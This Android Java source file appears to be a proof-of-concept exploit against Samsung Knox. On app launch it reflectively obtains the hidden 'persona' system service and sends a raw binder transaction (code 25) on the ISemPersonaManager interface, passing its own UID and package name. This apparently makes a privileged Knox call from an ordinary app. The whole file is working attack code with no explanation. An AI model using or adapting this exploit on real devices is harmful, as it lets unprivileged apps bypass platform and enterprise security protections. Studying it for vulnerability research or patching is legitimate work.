package poc.app;

import android.app.Activity;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.Process;

import java.util.Arrays;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {
            IBinder binder = (IBinder) Class.forName("android.os.ServiceManager")
                    .getMethod("getService", String.class)
                    .invoke(null, "persona");
            processBinder(binder);
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }

    private void processBinder(IBinder binder) {
        try {
            Parcel parcel = Parcel.obtain();
            parcel.writeInterfaceToken("com.samsung.android.knox.ISemPersonaManager");
            parcel.writeInt(Process.myUid());
            parcel.writeStringList(Arrays.asList(getPackageName()));

            Parcel reply = Parcel.obtain();

            binder.transact(25, parcel, reply, 0);
            reply.readException();
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }
}